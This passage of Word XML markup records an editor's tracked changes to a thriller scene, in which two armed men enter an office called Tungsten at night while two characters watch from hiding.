      <w:del w:id="809" w:author="TextVet" w:date="2016-03-16T14:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D4155B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="810" w:author="TextVet" w:date="2016-03-16T14:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E010F3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>cool, moist</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="811" w:author="TextVet" w:date="2016-03-16T14:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D4155B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> air</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “You’re right.” </w:t>
      </w:r>
      <w:ins w:id="812" w:author="TextVet" w:date="2016-03-16T14:58:00Z">
        <w:r w:rsidR="001C66D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>With an</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="813" w:author="TextVet" w:date="2016-03-16T14:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DB6014">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With a deep s</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="814" w:author="TextVet" w:date="2016-03-16T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001C66D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>igh</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="815" w:author="TextVet" w:date="2016-03-16T14:54:00Z">
        <w:r w:rsidR="00FD02CF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> abyss</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="816" w:author="TextVet" w:date="2016-03-16T14:58:00Z">
        <w:r w:rsidR="001C66D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>al sigh</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="817" w:author="TextVet" w:date="2016-03-16T14:58:00Z">
        <w:r w:rsidR="001C66D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="818" w:author="TextVet" w:date="2016-03-16T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001C66D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> took Jason’s hand and pulled himself </w:t>
      </w:r>
      <w:del w:id="819" w:author="TextVet" w:date="2016-03-16T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FD02CF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">up </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to his feet.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD5F67" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="820" w:author="TextVet" w:date="2016-03-16T15:18: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w:t>
      </w:r>
      <w:del w:id="821" w:author="TextVet" w:date="2016-03-16T15:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BD5F67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e stillness</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="822" w:author="TextVet" w:date="2016-03-16T14:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002D3842">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the night</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="823" w:author="TextVet" w:date="2016-03-16T15:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BD5F67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> was broken by th</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:del w:id="824" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006D62BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">soft </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="825" w:author="TextVet" w:date="2016-03-16T14:59:00Z">
        <w:r w:rsidR="002D3842">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>roll</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="826" w:author="TextVet" w:date="2016-03-16T14:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002D3842">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sound</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of tires on pavement</w:t>
      </w:r>
      <w:ins w:id="827" w:author="TextVet" w:date="2016-03-16T15:17:00Z">
        <w:r w:rsidR="006D62BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> s</w:t>
        </w:r>
        <w:r w:rsidR="00BD5F67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">lapped the nighttime stillness </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="828" w:author="TextVet" w:date="2016-03-16T15:19:00Z">
        <w:r w:rsidR="006D62BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">gently </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="829" w:author="TextVet" w:date="2016-03-16T15:17:00Z">
        <w:r w:rsidR="00BD5F67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>awak</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="830" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
        <w:r w:rsidR="00BD5F67">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e—</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00A81E5E" w:rsidRDefault="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:del w:id="831" w:author="TextVet" w:date="2016-03-16T15:00:00Z"/>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:pPrChange w:id="832" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
          <w:pPr>
            <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
            <w:ind w:firstLine="600"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="833" w:author="TextVet" w:date="2016-03-16T15:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00784D15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w:rsidR="00A81E5E" w:rsidRDefault="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:pPrChange w:id="834" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
          <w:pPr>
            <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
            <w:ind w:firstLine="600"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="835" w:author="TextVet" w:date="2016-03-16T15:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00784D15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>A</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="836" w:author="TextVet" w:date="2016-03-16T15:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293ABA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> sound that</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="837" w:author="TextVet" w:date="2016-03-16T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF7114">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> came</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="838" w:author="TextVet" w:date="2016-03-16T15:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293ABA">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 xml:space="preserve">oddly, </w:t>
      </w:r>
      <w:ins w:id="839" w:author="TextVet" w:date="2016-03-16T15:16:00Z">
        <w:r w:rsidR="003567B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sans</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="840" w:author="TextVet" w:date="2016-03-16T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AF7114">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with no corresponding</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="841" w:author="TextVet" w:date="2016-03-16T15:01:00Z">
        <w:r w:rsidR="00AF7114">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">an </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>engine</w:t>
      </w:r>
      <w:ins w:id="842" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
        <w:r w:rsidR="00BD5F67">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 xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="843" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001F12DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>rumble</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="844" w:author="TextVet" w:date="2016-03-16T15:18:00Z">
        <w:r w:rsidR="001F12DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>thrum</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gleaming white Tesla Roadster </w:t>
      </w:r>
      <w:ins w:id="845" w:author="TextVet" w:date="2016-03-16T15:02:00Z">
        <w:r w:rsidR="001D129A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sauntered</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="846" w:author="TextVet" w:date="2016-03-16T15:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001D129A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>made its way</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> up the street adjoining the office complexes.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Several cars had already driven by. What made Danny and Jason notice this one, besides its stylishness and the unusual, eerily quiet way it moved, was that it slowed down and swerved into the Tungsten parking lot.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Through the pine trees, they </w:t>
      </w:r>
      <w:del w:id="847" w:author="TextVet" w:date="2016-03-16T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943C50">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">could </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:ins w:id="848" w:author="TextVet" w:date="2016-03-16T15:03:00Z">
        <w:r w:rsidR="00943C50">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>aw</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="849" w:author="TextVet" w:date="2016-03-16T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943C50">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ee</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the Roadster stop just in front of Tungsten’s entrance. Two male figures emerged, clad in dark jackets and leather gloves.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Jason!” Mike’s </w:t>
      </w:r>
      <w:ins w:id="850" w:author="TextVet" w:date="2016-03-16T15:04:00Z">
        <w:r w:rsidR="00977D66">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>hissed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="851" w:author="TextVet" w:date="2016-03-16T15:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00977D66">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>voice came</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the SUV. “Are you watching the two guys?”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we can see them</w:t>
      </w:r>
      <w:del w:id="852" w:author="TextVet" w:date="2016-03-16T15:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F350F1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> from here</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,”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“For fuck’s sakes, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>get down</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” said Mike.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and Jason hid behind the black Navigator. “What’s going on?”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“Look at the parking lot camera,” said Mike.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brought up the video feed. The newcomers had athletic bodies, and hard faces that looked like they were comfortable and familiar with danger. They had slim cellphones with Bluetooth headsets, which they set up and put into their ears.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they had guns.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One carried a thin semiautomatic handgun; the other, a short silver revolver with a disproportionately large opening. The men held the firearms nonchalantly, casually gesturing with them as they talked.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a nod, the one with the revolver opened the Roadster’s door and retrieved something from inside — a Hello Kitty purse. The man pulled a keycard out of it, threw the purse back into the car, and walked to the entrance of Tungsten’s headquarters. A green light popped on above the door’s keycard reader. The man handed the keycard to his partner and entered the building.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other man remained out front, standing beside the front doors. He pulled back the slide on his weapon and deftly screwed a long black silencer onto the end of the barrel. </w:t>
      </w:r>
      <w:ins w:id="853" w:author="TextVet" w:date="2016-03-16T15:22:00Z">
        <w:r w:rsidR="00232875">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>His</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="854" w:author="TextVet" w:date="2016-03-16T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00232875">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> silencer </w:t>
      </w:r>
      <w:ins w:id="855" w:author="TextVet" w:date="2016-03-16T15:21:00Z">
        <w:r w:rsidR="00242632">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>secur</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="856" w:author="TextVet" w:date="2016-03-16T15:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00242632">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>firmly install</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed, he pushed a clip into the gun’s handgrip and released the slide, causing it to snap forward. He took off his jacket and draped it over his hand, concealing the weapon. Crooking his arm casually at his side, he leaned against the wall as though idly waiting for someone.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man with the </w:t>
      </w:r>
      <w:del w:id="857" w:author="TextVet" w:date="2016-03-16T15:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001B172A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">small </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">revolver strode </w:t>
      </w:r>
      <w:del w:id="858" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
